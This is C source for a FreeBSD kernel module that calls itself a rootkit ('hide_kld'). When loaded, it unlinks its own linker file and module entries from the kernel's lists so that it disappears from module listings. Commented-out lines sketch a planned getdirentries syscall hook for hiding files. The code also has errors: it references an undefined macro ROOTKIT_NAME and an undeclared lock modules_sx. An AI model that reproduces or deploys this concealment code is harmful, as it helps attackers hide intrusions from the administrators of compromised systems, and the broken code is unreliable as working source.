#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>

#include <sys/linker.h>
#include <sys/module.h>

#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

#define ROOTKIT_LINKER_NAME "hide_kld.ko"
#define ROOTKIT_MODULE_NAME "hide_kld"

extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;	/* chain together all modules */
	TAILQ_ENTRY(module)	flink;	/* all modules in a file */
	struct linker_file	*file;	/* file which contains this module */
	int			refs;	/* reference count */
	int 			id;	/* unique id number */
	char 			*name;	/* module name */
	modeventhand_t 		handler;	/* event handler */
	void 			*arg;	/* argument for handler */
	modspecific_t 		data;	/* module specific data */
};

static int hide_from_kld()
{
    struct linker_file *link_file;
    struct module *m;
    struct linker_file *kernel_file;

    // acquire a lock before accessing linker files
    sx_xlock(&kld_sx);

    // get reference to the "kernel" linker file
    kernel_file = (&linker_files)->tqh_first;

    // remove the rootkit's linker file
    TAILQ_FOREACH(link_file, &linker_files, link){
        if (strncmp(link_file->filename, ROOTKIT_LINKER_NAME, strlen(ROOTKIT_NAME)) == 0){
            kernel_file->refs--;
            next_file_id--;
            TAILQ_REMOVE(&linker_files, link_file, link);
            break;
        }
    }

    sx_xunlock(&kld_sx);

    sx_xlock(&modules_sx);

    // remove the modules of our rootkit
    TAILQ_FOREACH(m, &modules, link){
        if (strncmp(m->name, ROOTKIT_MODULE_NAME, strlen(ROOTKIT_MODULE_NAME)) == 0){
            nextid--;
            TAILQ_REMOVE(&modules, m, link);
        }
    }

    sx_xunlock(&modules_sx);

    return 0;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            log(LOG_DEBUG, "Hiding from KLD!\n");
            hide_from_kld();
            // sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirent_hook;
            break;
        case MOD_UNLOAD:
            log(LOG_DEBUG, "Unhiding from KLD!\n");
            // sysent[SYS_getdirentries].sy_call = (sy_call_t *) sys_getdirentries;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "hide_kld",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(hide_kld, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
